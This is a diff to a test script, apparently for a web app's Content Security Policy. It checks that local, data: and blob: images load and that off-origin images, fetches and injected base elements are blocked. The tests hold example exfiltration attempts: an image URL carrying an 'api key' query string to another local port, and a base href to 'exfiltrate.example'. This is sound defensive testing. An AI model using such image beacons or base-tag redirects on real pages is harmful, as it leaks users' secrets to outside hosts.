@@ -144,8 +144,26 @@ const PAGE = `<!doctype html><html><head>${CSP.META}
   }); };
 </script></body></html>`;
 
+const GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+
 (async () => {
+  /* Another origin that serves a real pixel and records every request, so an
+     image the policy lets through is seen ARRIVING, not inferred from a load
+     event: the review's repro, where fetch was refused and new Image() still
+     delivered its query string to another port. */
+  const offHits = [];
+  const off = http.createServer((req, res) => {
+    offHits.push(req.url);
+    res.writeHead(200, { 'content-type': 'image/gif', 'access-control-allow-origin': '*' });
+    res.end(GIF);
+  });
+  await new Promise(r => off.listen(0, '127.0.0.1', r));
+  const offOrigin = `http://127.0.0.1:${off.address().port}`;
   const server = http.createServer((req, res) => {
+    if (req.url === '/pixel.gif') {
+      res.writeHead(200, { 'content-type': 'image/gif' });
+      return res.end(GIF);
+    }
     if (req.url === '/allowed.json') {
       res.writeHead(200, { 'content-type': 'application/json' });
       return res.end('{"ok":true}');
@@ -173,6 +191,14 @@ const PAGE = `<!doctype html><html><head>${CSP.META}
      decodes fetched figures into data: URIs for the vision call. */
   const dataPix = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
   ok('a data: image still loads', await page.evaluate(s => window.__imgResult(s), dataPix) === 'loaded');
+  ok('a same-origin image still loads — content/figures and the icons',
+     await page.evaluate(() => window.__imgResult('/pixel.gif')) === 'loaded');
+  /* Made from bytes the page holds, as bankstore.js makes them; fetching the
+     data: URI would be refused by connect-src, which has no data:. */
+  ok('a blob: image still loads — the code-only deploy\'s figures', await page.evaluate(s => {
+    const bytes = Uint8Array.from(atob(s.split(',')[1]), c => c.charCodeAt(0));
+    return window.__imgResult(URL.createObjectURL(new Blob([bytes], { type: 'image/gif' })));
+  }, dataPix) === 'loaded');
   const sameOrigin = await page.evaluate(async () => {
     try { const r = await fetch('/allowed.json'); return (await r.json()).ok === true ? 'ok' : 'bad'; }
     catch (e) { return 'threw: ' + e.message; }
@@ -217,6 +243,17 @@ const PAGE = `<!doctype html><html><head>${CSP.META}
   ok('but Gemini is permitted — it fails on the network, not on the policy',
      !gem.some(v => v.directive === 'connect-src'), JSON.stringify(gem) || 'no violation');
 
+  /* The image route: what the fetch above was refused, an image used to
+     deliver. The off-origin server's own log is the instrument — a blocked
+     image never reaches it; a load event alone could not tell a refusal
+     from a server that never answered. */
+  const before = offHits.length;
+  const img = await violated(u => window.__imgResult(u + '/pixel.gif?k=' + encodeURIComponent('the fellow\'s api key')),
+    offOrigin, 'img-src');
+  await page.waitForTimeout(300);
+  ok('an image from another host is blocked by img-src', img.some(v => v.directive === 'img-src'), JSON.stringify(img) || 'no violation');
+  ok('and the other host never receives the request', offHits.length === before, offHits.slice(before).join(', ') || 'none');
+
   const base = await violated(() => {
     const b = document.createElement('base');
     b.href = 'https://exfiltrate.example/';
@@ -243,6 +280,7 @@ const PAGE = `<!doctype html><html><head>${CSP.META}
 
   await browser.close();
   server.close();
+  off.close();
   console.log(`\n${passed} passed, ${failed} failed`);
   process.exit(failed ? 1 : 0);
 })().catch(died);
